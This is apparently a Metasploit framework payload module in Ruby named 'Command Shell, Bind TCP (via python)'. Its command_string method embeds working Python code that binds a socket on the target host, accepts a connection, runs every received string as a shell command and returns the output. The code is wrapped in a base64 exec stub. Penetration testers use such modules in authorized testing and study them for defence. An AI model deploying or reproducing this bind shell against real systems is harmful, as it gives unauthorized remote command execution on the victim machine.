
module MetasploitModule

  CachedSize = 481

  include Msf::Payload::Single
  include Msf::Payload::Python
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name' => 'Command Shell, Bind TCP (via python)',
      'Description' => 'Creates an interactive shell via Python, encodes with base64 by design. Compatible with Python 2.4-2.7 and 3.4+.',
      'Author' => 'mumbai',
      'License' => MSF_LICENSE,
      'Platform' => 'python',
      'Arch' => ARCH_PYTHON,
      'Handler' => Msf::Handler::BindTcp,
      'Session' => Msf::Sessions::CommandShell,
      'PayloadType' => 'python',
      'Payload' =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  def generate
    super + command_string
  end

  def command_string
    cmd = <<~PYTHON
      import socket as s
      import subprocess as r
      so=s.socket(s.AF_INET,s.SOCK_STREAM)
      so.bind(('#{datastore['RHOST']}',#{ datastore['LPORT']}))
      so.listen(1)
      so,addr=so.accept()
      while True:
      	d=so.recv(1024)
      	if len(d)==0:
      		break
      	p=r.Popen(d,shell=True,stdin=r.PIPE,stdout=r.PIPE,stderr=r.PIPE)
      	o=p.stdout.read()+p.stderr.read()
      	so.send(o)
    PYTHON

    py_create_exec_stub(cmd)
 end
end
